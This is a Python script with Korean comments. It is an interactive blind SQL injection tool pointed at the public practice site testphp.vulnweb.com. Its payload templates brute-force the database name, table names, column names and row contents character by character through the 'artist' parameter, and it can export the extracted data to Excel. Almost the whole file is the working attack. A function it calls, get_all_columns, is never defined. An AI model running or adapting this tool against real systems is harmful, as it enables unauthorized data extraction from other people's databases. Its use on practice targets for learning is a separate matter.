import requests
import pandas as pd
from tabulate import tabulate
import os
import time
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill
from datetime import datetime
import urllib3

# InsecureRequestWarning 무시 설정
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 설정 정보
url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
param_name = "artist"  # 공격할 파라미터 이름
true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
sleep_time = 0  # 요청 간 지연 시간 (초)

# SQL Injection 페이로드 템플릿 설정
payload_templates = {
    "database_name": "1 AND SUBSTRING(DATABASE(), {i}, 1) = '{char}' --",
    "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT {index},1), {i}, 1) = '{char}' --",
    "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
    "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
}

# 참/거짓 판별 함수
def is_true_response(response):
    return true_response_indicator in response.text

# 데이터베이스 이름 추출 함수
def get_database_name():
    db_name = ""
    print("[정보] 데이터베이스 이름을 찾고 있습니다...")
    for i in range(1, 50):  # 최대 길이 50자 가정
        found_char = False
        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
            payload = payload_templates["database_name"].format(i=i, char=char)
            params = {param_name: payload}
            response = send_request(params)
            time.sleep(sleep_time)  # 요청 후 지연

            if is_true_response(response):
                db_name += char
                print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                found_char = True
                break
        if not found_char:
            break
    print(tabulate([[db_name]] if db_name else [], headers=["Database Name"], tablefmt="grid"))
    print(f"총 1건" if db_name else "총 0건")
    return db_name

# 테이블 이름 추출 함수
def get_table_names(limit="ALL"):
    tables = []
    print("[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
    for index in range(0, 100 if limit == "ALL" else int(limit)):  # 최대 100개 테이블 또는 사용자 지정 개수
        table_name = ""
        for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
            found_char = False
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                payload = payload_templates["table_name"].format(index=index, i=i, char=char)
                params = {param_name: payload}
                response = send_request(params)
                time.sleep(sleep_time)  # 요청 후 지연

                if is_true_response(response):
                    table_name += char
                    found_char = True
                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                    break
            if not found_char:
                break
        if table_name:
            tables.append(table_name)
            print(f"[테이블 발견] {index + 1}번째 테이블 이름: {table_name}")
        else:
            break
    print(tabulate([[t] for t in tables] if tables else [], headers=["Table Names"], tablefmt="grid"))
    print(f"총 {len(tables)}건")
    return tables

# 컬럼 이름 추출 함수
def get_column_names(table_name, limit="ALL"):
    columns = []
    print(f"[정보] '{table_name}' 테이블의 컬럼명을 찾고 있습니다...")
    for index in range(0, 100 if limit == "ALL" else int(limit)):  # 최대 100개 컬럼 또는 사용자 지정 개수
        column_name = ""
        for i in range(1, 50):  # 최대 컬럼 이름 길이 50자 가정
            found_char = False
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                payload = payload_templates["column_name"].format(table_name=table_name, index=index, i=i, char=char)
                params = {param_name: payload}
                response = send_request(params)
                time.sleep(sleep_time)  # 요청 후 지연

                if is_true_response(response):
                    column_name += char
                    found_char = True
                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
                    break
            if not found_char:
                break
        if column_name:
            columns.append(column_name)
            print(f"[컬럼 발견] {index + 1}번째 컬럼 이름: {column_name}")
        else:
            break
    print(tabulate([[c] for c in columns] if columns else [], headers=["Column Names"], tablefmt="grid"))
    print(f"총 {len(columns)}건")
    return columns

# 특정 테이블 컬럼의 데이터 추출 함수
def get_column_data(table_name, column_name, limit="ALL"):
    data = []
    print(f"[정보] '{table_name}' 테이블의 '{column_name}' 컬럼 데이터를 찾고 있습니다...")

    for index in range(0, 100 if limit == "ALL" else int(limit)):  # 최대 100개 데이터 행 또는 사용자 지정 개수
        row_data = ""
        for i in range(1, 50):  # 데이터 길이 최대 50자 가정
            found_char = False
            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
                payload = payload_templates["column_data"].format(table_name=table_name, column_name=column_name, index=index, i=i, char=char)
                params = {param_name: payload}
                response = send_request(params)
                time.sleep(sleep_time)  # 요청 후 지연

                if is_true_response(response):
                    row_data += char
                    found_char = True
                    print(f"[데이터 발견] 위치 {i}에서 '{char}' 문자 발견!")
                    break
            if not found_char:
                break
        if row_data:
            data.append(row_data)
            print(f"[데이터 발견] {index + 1}번째 행 데이터: {row_data}")
        else:
            break
    print(tabulate([[d] for d in data] if data else [], headers=["Data"], tablefmt="grid"))
    print(f"총 {len(data)}건")
    return data

# 요청 전송 함수
def send_request(params):
    if request_method == "POST":
        return requests.post(url, data=params, timeout=90, verify=False)
    elif request_method == "GET":
        return requests.get(url, params=params, timeout=90, verify=False)
    else:
        raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")

# 엑셀 저장 함수
def save_to_excel(data, headers, base_filename):
    # 파일명 생성 (오늘의 날짜 사용)
    date_str = datetime.now().strftime("%Y-%m-%d")
    filename = f"{base_filename}_{date_str}.xlsx"
    count = 1
    while os.path.exists(filename):
        filename = f"{base_filename}_{date_str}({count}).xlsx"
        count += 1

    wb = Workbook()
    ws = wb.active
    ws.title = "Extracted Data"

    # 헤더 작성 및 스타일 적용
    for col_num, header in enumerate(headers, 1):
        cell = ws.cell(row=1, column=col_num, value=header)
        cell.font = Font(bold=True, color="FFFFFF")
        cell.fill = PatternFill(start_color="4F81BD", end_color="4F81BD", fill_type="solid")

    # 데이터 작성
    for row_num, row_data in enumerate(data, 2):
        for col_num, cell_value in enumerate(row_data, 1):
            ws.cell(row=row_num, column=col_num, value=cell_value)

    # 열 너비 자동 조정
    for col in ws.columns:
        max_length = 0
        col_letter = col[0].column_letter
        for cell in col:
            try:
                if len(str(cell.value)) > max_length:
                    max_length = len(str(cell.value))
            except:
                pass
        adjusted_width = (max_length + 2)
        ws.column_dimensions[col_letter].width = adjusted_width

    # 엑셀 파일 저장
    wb.save(filename)
    print(f"[엑셀 저장 완료] 파일명: {filename}")

# 명령 선택 실행 함수
def main():
    global request_method
    while True:
        print("\n[옵션 선택]")
        print("1. 데이터베이스 추출")
        print("2. 테이블 추출")
        print("3. 컬럼 추출")
        print("4. 데이터 추출")
        print("5. 종료")
        choice = input("작업을 선택하세요: ")

        if choice in ["1", "2", "3", "4"]:
            request_method = input("요청 방식을 선택하세요 (GET/POST): ").strip().upper()
            if request_method not in ["GET", "POST"]:
                print("잘못된 요청 방식입니다. GET 또는 POST 중 하나를 입력하세요.")
                continue

        if choice == "1":
            db_name = get_database_name()
        elif choice == "2":
            limit = input("추출할 테이블 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
            tables = get_table_names(limit)
        elif choice == "3":
            table_choice = input("1. 특정 테이블의 컬럼 추출\n2. 전체 테이블의 컬럼 추출\n선택하세요: ").strip()
            if table_choice == "1":
                table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
                limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
                columns = get_column_names(table_name, limit)
            elif table_choice == "2":
                all_columns = get_all_columns()
            else:
                print("잘못된 선택입니다. 다시 입력하세요.")
        elif choice == "4":
            table_name = input("데이터를 가져올 테이블 이름을 입력하세요: ")
            column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ").strip().upper()
            limit = input("추출할 데이터 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()

            if column_name == "ALL":
                columns = get_column_names(table_name)
                all_data = {column: get_column_data(table_name, column, limit) for column in columns}
                max_length = max(len(v) for v in all_data.values())
                for column in all_data:
                    all_data[column] += [""] * (max_length - len(all_data[column]))
                data_rows = [list(row) for row in zip(*all_data.values())]
                print(tabulate(data_rows, headers=all_data.keys(), tablefmt="grid"))
                save_choice = input("데이터를 엑셀로 저장하시겠습니까? (Y/N): ").strip().upper()
                if save_choice == "Y":
                    save_to_excel(data_rows, list(all_data.keys()), "extracted_data")
            else:
                data = get_column_data(table_name, column_name, limit)
                print(tabulate([[d] for d in data] if data else [], headers=[column_name], tablefmt="grid"))
                save_choice = input("데이터를 엑셀로 저장하시겠습니까? (Y/N): ").strip().upper()
                if save_choice == "Y":
                    save_to_excel([[d] for d in data], [column_name], "extracted_data")
        elif choice == "5":
            print("프로그램을 종료합니다.")
            break
        else:
            print("잘못된 선택입니다. 다시 입력하세요.")

# 프로그램 실행
if __name__ == "__main__":
    main()
